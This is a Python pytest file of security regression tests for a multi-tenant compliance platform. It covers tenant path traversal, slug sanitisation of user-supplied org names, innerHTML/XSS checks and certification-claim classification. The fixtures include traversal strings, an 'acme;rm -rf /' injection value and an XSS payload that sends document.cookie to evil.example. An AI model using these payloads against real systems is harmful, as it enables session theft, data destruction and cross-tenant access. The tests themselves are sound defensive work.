"""Platform security invariants — Constat's own posture, not the answer gates.

`test_gates.py` proves the engine will not make a claim it cannot support.
These prove the platform around it does not hand an attacker something else:
a way across the tenant boundary, a way to run script in an operator's browser,
or a certification claim that slipped past classification because nobody had
heard of the scheme yet.

Adapted from the archived v0 suite (tag archive/v0-master-20260825). Every test
here failed before the corresponding fix. Tests from that suite covering
components this trunk does not have — the signed audit key, the standalone
ReviewSession, the Vercel CSP header, the `trustops.webapi` rate limiter — are
deliberately absent rather than rewritten against something that only
resembles them. What this trunk adds instead is the workspace slug: on this
line of work a tenant name is *derived from a user-supplied org name* at
signup, so the slug has its own section below.
"""
from __future__ import annotations

import json
import re
import sys
from datetime import date
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

from constat.drafter import MockDrafter
from constat.evidence import (MAX_SOURCE_BYTES, EvidenceStore, validate_tenant)
from constat.gates import classify, post_gate, pre_gate
from constat.models import Question
from constat.retrieve import Retriever
from constat.semantic import HashedNgramEmbedder, SemanticRetriever, build_index
from constat.server import app as server_app
from constat.server import auth, config

EVIDENCE = ROOT / "data" / "evidence"
TODAY = date(2026, 8, 8)

SOURCE_TMPL = """---
source_id: {sid}
title: {title}
type: {dtype}
version: "1.0"
effective_date: 2026-01-01
expiry_date: 2027-01-01
owner: sec@example.com
approval_status: approved
topics: encryption, transit
---

{body}
"""


def _corpus(root: Path, tenant: str, sid: str, body: str,
            title: str = "Information Security Policy",
            dtype: str = "policy") -> Path:
    d = root / tenant
    d.mkdir(parents=True, exist_ok=True)
    p = d / f"{sid}.md"
    p.write_text(SOURCE_TMPL.format(sid=sid, title=title, dtype=dtype, body=body),
                 encoding="utf-8")
    return p


# --- S1: the tenant name is a boundary, not a string ------------------------
# The original: EvidenceStore("../evidence/globex", root) loaded another
# tenant's corpus while believing that crafted string WAS its tenant, so the
# retriever's boundary assertion compared the name against itself and passed.
@pytest.mark.parametrize("probe", [
    "../evidence/globex",       # the original traversal
    "..",
    "acme/../globex",
    "/etc",
    "acme/",
    "ACME",                     # case games against a case-insensitive filesystem
    "",
    ".",
    "a",                        # below the two-character floor every layer sets
    "acme\x00",
    "acme/../../data/evidence/globex",
])
def test_s1_tenant_traversal_is_refused(probe):
    with pytest.raises((PermissionError, FileNotFoundError, ValueError)):
        EvidenceStore(probe, EVIDENCE)


def test_s1_the_traversal_no_longer_loads_another_tenants_corpus():
    """The precise reproduction from the finding, asserted as fail-closed."""
    with pytest.raises(PermissionError):
        EvidenceStore("../evidence/globex", EVIDENCE)
    # and the tenant it was reaching for is still perfectly loadable on its own
    assert len(EvidenceStore("globex", EVIDENCE).sources) > 0


def test_s1_retriever_validates_the_query_tenant():
    store = EvidenceStore("acme", EVIDENCE)
    with pytest.raises(PermissionError):
        Retriever(store).search("anything", tenant="../evidence/globex")


def test_s1_semantic_retriever_validates_the_query_tenant(tmp_path):
    """The hosted server searches through SemanticRetriever, not Retriever, so
    the same self-comparison hole existed on the path real tenants use."""
    root = tmp_path / "evidence"
    _corpus(root, "alpha", "POL-A", "All traffic is encrypted in transit.")
    store = EvidenceStore("alpha", root)
    emb = HashedNgramEmbedder()
    idx = tmp_path / "idx"
    build_index(store, idx, emb)
    r = SemanticRetriever(store, idx, emb)
    assert r.search("encrypted in transit", tenant="alpha")
    with pytest.raises(PermissionError):
        r.search("encrypted in transit", tenant="../evidence/globex")


def test_s1_valid_tenant_still_loads():
    assert validate_tenant("acme") == "acme"
    assert len(EvidenceStore("acme", EVIDENCE).sources) > 0


def test_s1_symlink_out_of_the_tenant_directory_is_refused(tmp_path):
    root = tmp_path / "evidence"
    (root / "alpha").mkdir(parents=True)
    real = _corpus(root, "beta", "SECRET", "Beta's private control.")
    (root / "alpha" / "LINK.md").symlink_to(real)
    with pytest.raises(PermissionError, match="outside its own directory"):
        EvidenceStore("alpha", root)


def test_s1_oversized_source_is_refused(tmp_path):
    root = tmp_path / "evidence"
    (root / "alpha").mkdir(parents=True)
    (root / "alpha" / "BIG.md").write_text("x" * (MAX_SOURCE_BYTES + 1), encoding="utf-8")
    with pytest.raises(ValueError, match="source limit"):
        EvidenceStore("alpha", root)


# --- S1b: the workspace slug is that same boundary, derived from user input --
# New on this trunk. signup takes an arbitrary org name and mints a slug that
# is simultaneously a URL path segment, a SQLite key and a directory name.
HOSTILE_ORGS = [
    "../evidence/globex",
    "../../etc",
    "..",
    "acme/../globex",
    "/etc/passwd",
    "acme\x00globex",
    "....//....//globex",
    "ACME",
    "  ..  ",
    "%2e%2e%2fglobex",
    "acme;rm -rf /",
    "A!",                       # the one-character base
    "。。/globex",
    "x" * 200,
]


@pytest.mark.parametrize("org", HOSTILE_ORGS)
def test_s1b_a_crafted_org_name_cannot_craft_a_slug(org):
    """Whatever the org name, the slug must be legal at every layer that
    consumes it: the token, the router, and the evidence store."""
    slug = auth.make_slug(org, taken=set())
    assert auth.SLUG_RE.match(slug), f"{org!r} -> {slug!r} rejected by the token layer"
    assert re.fullmatch(server_app.SLUG, slug), f"{org!r} -> {slug!r} unroutable"
    assert validate_tenant(slug) == slug
    assert "/" not in slug and ".." not in slug and "\x00" not in slug


@pytest.mark.parametrize("org", HOSTILE_ORGS)
def test_s1b_a_crafted_slug_cannot_escape_its_workspace_tree(org):
    slug = auth.make_slug(org, taken=set())
    for path in (config.tenant_dir(slug), config.evidence_root(slug),
                 config.runs_dir(slug), config.uploads_dir(slug)):
        assert config.TENANTS in path.resolve().parents, \
            f"{org!r} -> {slug!r} escaped to {path}"


@pytest.mark.parametrize("path", [
    "/t/../evidence/globex",
    "/t/acme/../globex/api/state",
    "/t/..%2fglobex",
    "/t/a",                     # below the floor, so never routed
    "/t/ACME",
    "/t/acme%00/api/state",
])
def test_s1b_router_refuses_a_traversing_workspace_path(path):
    """No route may even match: the handler is never reached, so the slug is
    never handed to the filesystem in the first place."""
    matched = [name for method, pat, name, _auth in server_app.ROUTES
               if method in ("GET", "POST", "DELETE") and pat.match(path)]
    assert matched == [], f"{path!r} matched {matched}"


def test_s1b_a_normal_org_name_still_produces_a_usable_workspace():
    slug = auth.make_slug("Globex Corporation, Inc.", taken=set())
    assert slug == "globex-corporation-inc"
    assert validate_tenant(slug) == slug
    token, token_hash = auth.mint_token(slug)
    assert auth.token_slug(token) == slug
    assert auth.token_matches(token, token_hash)
    # collision handling must not break the shape either
    second = auth.make_slug("Globex Corporation, Inc.", taken={slug})
    assert second == f"{slug}-2" and validate_tenant(second) == second


def test_s1b_the_store_still_refuses_a_slug_that_was_never_minted_here():
    """Defence in depth: even if a crafted slug reached this far, the store is
    the layer that refuses it, not a caller that remembered to check."""
    with pytest.raises(PermissionError):
        EvidenceStore("../evidence/globex", config.evidence_root("acme"))


# --- S2: nothing from a document is ever parsed as HTML ---------------------
# An answer is a paragraph lifted verbatim from a client-supplied file, so any
# client that assigns engine output to innerHTML executes markup planted in an
# ingested PDF inside the reviewer's browser. Engine- and uploader-derived
# values are therefore inserted as text nodes. innerHTML survives only where
# the whole string is a literal authored in the source, and each survivor is
# named here so that a new one has to be argued for rather than merely added.
ALLOWED_INNERHTML = {
    "constat/server/pages.py": {
        # progressHTML/resultCard interpolate only numbers coerced with
        # Number() and question text defined in demo_questions.py
        "$('runstat').innerHTML=progressHTML(",
        "$('runstat').innerHTML=resultCard(",
        "$('runstat').innerHTML='';",
    },
    "site/index.template.html": {
        'mark.innerHTML=s.length>7',        # the wordmark, a constant in this file
        "tally.innerHTML=`<b>${cited}</b>",  # two array lengths
        '$("answer").innerHTML="";',         # clearing, not assigning
    },
    "site/index.html": {                     # generated from the template above
        'mark.innerHTML=s.length>7',
        "tally.innerHTML=`<b>${cited}</b>",
        '$("answer").innerHTML="";',
    },
    "ui/app.py": {
        "sel.innerHTML=opts.drafters",       # drafter ids from server config
        "$('chips').innerHTML=opts.demo",    # DEMO_QUESTIONS, a constant in this file
        "$('tiles').innerHTML=tile(",        # run metrics, all numeric
    },
}


@pytest.mark.parametrize("rel", sorted(ALLOWED_INNERHTML))
def test_s2_only_reviewed_literal_innerhtml_survives(rel):
    allowed = ALLOWED_INNERHTML[rel]
    offenders = []
    # an ASSIGNMENT, so the prose in these files' own docstrings and comments
    # may keep saying the word without tripping the test
    assign = re.compile(r"\.innerHTML\s*=")
    for n, line in enumerate((ROOT / rel).read_text(encoding="utf-8").splitlines(), 1):
        s = line.strip()
        if not assign.search(s) or s.startswith(("#", "//", "*", "/*")):
            continue
        if not any(frag in s for frag in allowed):
            offenders.append(f"{rel}:{n}: {s[:110]}")
    assert offenders == [], (
        "innerHTML assignment that is not on the reviewed-literal list. If this "
        "is engine or uploader output, build it with textContent / "
        "createTextNode / el() instead:\n" + "\n".join(offenders))


def test_s2_the_generated_landing_page_matches_its_template():
    """site/index.html is generated from site/index.template.html. A fix made
    only in the generated file is erased by the next build, so the two must
    agree on how the demo renders."""
    tpl = (ROOT / "site" / "index.template.html").read_text(encoding="utf-8")
    gen = (ROOT / "site" / "index.html").read_text(encoding="utf-8")
    for marker in ('$("answer").replaceChildren(',
                   '$("prov").replaceChildren(prov);',
                   '$("gaps").replaceChildren(',
                   "const dnode=(tag,cls,text)=>"):
        assert marker in tpl, f"template lost {marker!r}"
        assert marker in gen, f"site/index.html is stale: rebuild it ({marker!r})"


def test_s2_markup_in_an_uploaded_document_survives_only_as_data(tmp_path):
    """The engine may legitimately return a payload as answer TEXT — that is
    what the document says. What must never happen is a client parsing it as
    markup, which is what the innerHTML test above enforces."""
    payload = '<img src=x onerror="fetch(\'//evil.example/\'+document.cookie)">'
    root = tmp_path / "evidence"
    _corpus(root, "redteam", "POL-XSS",
            f"All customer data is encrypted in transit using TLS 1.2. {payload}")
    store = EvidenceStore("redteam", root)
    q = Question(question_id="XSS", row=0, domain="",
                 text="Is customer data encrypted in transit?")
    d = MockDrafter(Retriever(store)).draft(q, "redteam")
    d = post_gate(q, pre_gate(q, d), store, TODAY)

    assert d.answer and payload in d.answer, "expected the payload to be retrieved as text"
    # the contract is JSON, so it round-trips as a string and never as markup
    restored = json.loads(json.dumps(d.to_contract()))
    assert isinstance(restored["answer"], str)
    assert payload in restored["answer"]


# --- S3: certification status is classified by shape, not by an allowlist ----
# The allowlist knew ISO 27001 but not ISO 42001, and knew "attestation" but
# not "hold a ... report", so two obvious certification questions were never
# classified as certification claims — and a roadmap or a policy could satisfy
# them.
@pytest.mark.parametrize("text", [
    "Are you certified to ISO/IEC 42001?",           # scheme half was blind
    "Do you hold a SOC 2 Type II report?",           # verb half was blind
    "Is your organization ISO 27001 certified?",     # the case that always worked
    "Are you certified to ISO 42001?",
    "Do you hold an ISO/IEC 27701 certificate?",
    "Are you CMMC Level 2 certified?",
    "Do you maintain FedRAMP authorization?",
])
def test_s3_certification_questions_are_classified(text):
    q = Question(question_id="C", row=0, domain="", text=text)
    assert classify(q)["certification_claim"] is True, f"not classified: {text!r}"


@pytest.mark.parametrize("text", [
    "Do you encrypt customer data at rest?",
    "How many days after termination is customer data deleted?",
    "Describe your incident response process.",
])
def test_s3_ordinary_questions_are_not_certification_claims(text):
    q = Question(question_id="N", row=0, domain="", text=text)
    assert classify(q)["certification_claim"] is False, f"over-classified: {text!r}"


def test_s3_a_roadmap_cannot_satisfy_an_iso_42001_claim(tmp_path):
    """The end-to-end consequence of the classification fix: with 42001 unknown
    to the pattern this answered "yes, per the roadmap"."""
    root = tmp_path / "evidence"
    _corpus(root, "acme", "PLN-42001",
            "Acme plans to pursue ISO/IEC 42001 certification for its AI "
            "management system during the 2027 financial year.",
            title="ISO 42001 Certification Roadmap", dtype="roadmap")
    store = EvidenceStore("acme", root)
    q = Question(question_id="A&A-42", row=0, domain="Audit",
                 text="Are you certified to ISO/IEC 42001?")
    d = MockDrafter(Retriever(store)).draft(q, "acme")
    d = post_gate(q, pre_gate(q, d), store, TODAY)

    assert d.answer is None and d.abstained
    assert not d.citations, "a roadmap must not survive as certification evidence"
    assert any("CERT" in f for f in d.gate_flags)
    assert d.requires_human
